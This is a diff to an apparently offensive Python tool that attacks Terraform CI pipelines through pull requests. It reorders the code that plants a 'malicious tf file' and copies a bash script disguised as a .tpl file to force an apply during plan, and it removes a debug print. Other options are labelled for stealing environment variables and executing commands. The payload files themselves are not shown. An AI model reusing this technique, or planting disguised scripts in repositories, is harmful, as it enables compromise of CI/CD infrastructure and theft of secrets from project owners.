@@ -105,18 +105,18 @@ def apply_on_plan(tmp_folder, terraform_folder):
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance002.tf")
     print(f"[+] Copying template file from {src_file} to {dst_file}")
     shutil.copy(src_file, dst_file) 
-    
-    # We add the "malicious tf file" with an AWS S3 bucket
-    src_file = os.path.join(SCRIPT_PATH, "templates/s3_bucket.tf")
-    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance003")
-    print(f"[+] Copying template file from {src_file} to {dst_file}")
-    shutil.copy(src_file, dst_file) 
 
     s = Template(open(dst_file, "r").read())
     # The command we will run is a bash script
     template_filled = s.substitute(command="bash instance.tpl")
     open(dst_file, "w").write(template_filled)
-
+   
+    # We add the "malicious tf file" with an AWS S3 bucket
+    src_file = os.path.join(SCRIPT_PATH, "templates/s3_bucket.tf")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance003")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+ 
     # We add the bash script that performs the apply
     # Pretend the malicious script is a .tpl file
     src_file = os.path.join(SCRIPT_PATH, "templates/apply_on_plan.sh")
@@ -225,7 +225,6 @@ def main():
     # Create a temp folder to use it during the attack
     tmp_folder = setup_temp_folder(args.repo)
 
-    print(args.get_envs)
     if args.get_envs:
         url_pr = get_all_envs(tmp_folder, args.folder)
     elif args.exec_command:
